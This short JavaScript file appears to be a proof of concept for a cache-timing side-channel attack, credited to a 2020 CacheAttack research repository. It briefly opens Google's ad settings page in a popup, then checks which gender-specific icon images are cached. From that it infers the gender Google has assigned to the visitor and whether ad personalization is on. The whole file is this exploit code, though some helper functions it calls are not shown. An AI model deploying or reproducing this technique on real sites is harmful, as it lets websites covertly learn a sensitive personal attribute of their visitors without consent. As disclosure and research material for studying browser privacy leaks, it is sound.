/*jshint esversion: 8 */

// NDev 2020 https://github.com/NDevTK/CacheAttack/tree/master/Gender

Rules = new Map();

async function getGender() {
	var ads = open("https://adssettings.google.com/authenticated");
	setTimeout(async _  => ads.close(), 500);
	setTimeout(async _  => {
		var result = await GenderDetect();
		gender.innerText = "Result: "+ result;
	}, 1000);
}

async function getRules() {
	Gender("Female");
	Gender("Male");
	return Rules;
}

function Gender(g) {
	Rules.set("https://www.gstatic.com/identity/boq/adssettingsui/demographic/i_gender_"+g.toLowerCase()+"_ee2fb99c014437125dfe9358e4ea50aa.svg", g);
}

async function AdPref() {
	return await ifCached("https://www.gstatic.com/identity/boq/adssettingsui/demographic/i_age_ee6695b8688539f7175e364579d4a749.svg");
}

async function GenderDetect() {
	var Test = await AdPref();
	if(!Test) return "Ad personalization is OFF";
	var images = await getWebsites();
	if(images.length > 1) return "Multiple genders cached";
	return (images.length === 1) ? images[0] : "Rather not say";
}
